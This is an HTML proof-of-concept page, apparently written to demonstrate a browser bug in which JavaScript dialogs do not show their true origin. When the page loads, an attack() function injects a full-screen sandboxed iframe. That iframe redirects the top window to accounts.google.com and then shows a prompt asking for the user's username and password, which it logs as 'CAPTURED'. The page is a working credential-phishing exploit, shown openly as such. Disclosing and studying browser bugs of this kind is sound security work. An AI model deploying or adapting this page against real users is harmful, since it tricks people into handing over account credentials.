<html>
  <head>
    <meta charset="utf-8" />
    <title>Missing Origin on Dialog Javascript</title>
  </head>
  <body>
    <script>
      function attack() {
        const iframe = document.createElement("iframe");
        iframe.sandbox =
          "allow-scripts allow-modals allow-popups allow-top-navigation";
        iframe.style.cssText =
          "position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999";
        iframe.srcdoc = `
        <!DOCTYPE html>
        <html>
        <body style="margin:0;background:#000">
            <script>
                top.location.href = "https://accounts.google.com";
                setTimeout(() => {
                    const c = prompt("Enter your username:password");
                    if (c) {
                        console.log('CAPTURED:', c);
                    }
                }, 50);
            <\/script>
        </body>
        </html>
    `;
        document.body.appendChild(iframe);
      }

      window.onload = () => {
        attack();
      };
    </script>
  </body>
</html>
